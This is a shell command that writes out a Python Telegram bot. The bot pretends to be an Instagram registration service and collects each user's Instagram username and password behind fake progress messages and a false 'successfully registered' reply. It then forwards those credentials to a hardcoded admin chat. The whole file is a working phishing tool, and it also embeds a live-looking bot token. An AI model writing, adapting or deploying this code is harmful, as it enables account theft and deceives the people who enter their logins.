echo 'import telebot
from flask import Flask, request
import time
import threading
import os

TOKEN = "7419649484:AAGVTtcjwUVOotnOQU8zm71IGhxTctW1Tj8"
ADMIN_ID = 73493209

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_data = {}

@app.route("/webhook", methods=["POST"])
def webhook():
    json_str = request.get_data().decode("UTF-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "!", 200

@app.route("/")
def home():
    return "Bot ishlayapti!"

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    user_data[user_id] = {}
    bot.send_message(user_id, "📥 Your Instagram username:")

@bot.message_handler(func=lambda message: True)
def collect_data(message):
    user_id = message.chat.id
    if user_id not in user_data:
        user_data[user_id] = {}
        bot.send_message(user_id, "📥 Your Instagram username:")
        return

    if "username" not in user_data[user_id]:
        user_data[user_id]["username"] = message.text
        msg = bot.send_message(user_id, "🔍 Searching...")
        threading.Thread(target=ask_password, args=(user_id, msg.message_id)).start()
    elif "password" not in user_data[user_id]:
        user_data[user_id]["password"] = message.text
        msg = bot.send_message(user_id, "⏳ Registration...")
        threading.Thread(target=finish_registration, args=(user_id, msg.message_id)).start()

def ask_password(user_id, msg_id):
    time.sleep(2)
    bot.edit_message_text(chat_id=user_id, message_id=msg_id, text="📥 Your Instagram password:")

def finish_registration(user_id, msg_id):
    time.sleep(2)
    bot.edit_message_text(chat_id=user_id, message_id=msg_id, text="✅ Thank you! You have successfully registered.")
    data = user_data[user_id]
    msg = f"💬 Instagram login maʼlumotlar:\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
    bot.send_message(ADMIN_ID, msg)
    del user_data[user_id]

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
' > main.py
